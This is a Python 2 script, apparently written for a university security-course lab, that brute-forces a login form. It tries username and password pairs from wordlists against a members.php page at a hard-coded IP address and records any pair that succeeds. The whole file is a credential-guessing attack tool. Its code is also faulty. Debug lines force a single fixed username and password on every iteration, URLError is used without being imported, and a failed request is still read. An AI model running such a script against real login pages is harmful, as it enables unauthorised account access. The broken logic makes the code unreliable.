import urllib2, urllib, cookielib, sys

def main():
    count = sys.argv[1]
    lower = int(sys.argv[2])
    upper = int(sys.argv[3])
    log = open('log/log'+count+'.txt','w')
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    with open('passwords.txt', 'r') as f:
        passwords = f.readlines()
    passwords = map(lambda x: x.strip('\n'), passwords)
    # names = ['j1']
    # passwords = ['j']
    with open('users.txt', 'r') as f:
        users = f.readlines()
    users = map(lambda x: x.strip('\n'), users)

    url = "http://128.10.126.25/cs526private/members.php?"
    # url = "http://128.10.126.25/~reese5/cs526/members.php?"
    for user in users[lower:upper]:
        user = 'jacob'
        print('starting'+repr(user)+'...')
        log.write('starting'+repr(user)+'...\n')
        i = 0
        for pwd in passwords:
            pwd = 'zabdasxa'
            if i%5000 == 0:
                log.write('checked '+str(i)+' passwords\n')
            # print name, pwd
            data = urllib.urlencode({'username': user, 'password': pwd, 'submit': 'Login'})
            # req = urllib2.Request(url, data)
            try:
                request = opener.open(url, data)
            except URLError as u:
                print 'FAIL: ',u.reason
            page = request.read()

            with open('test'+pwd+'.html','w') as f:
                f.write(page)
            i+=1
            if page[-1] != '.':
                log.write(repr(user)+' '+repr(pwd)+'\n')
                with open('crack/crack'+count+'.txt','w') as f:
                    f.write(repr(user)+' '+repr(pwd)+'\n')
                break

if __name__ == '__main__':
    main()
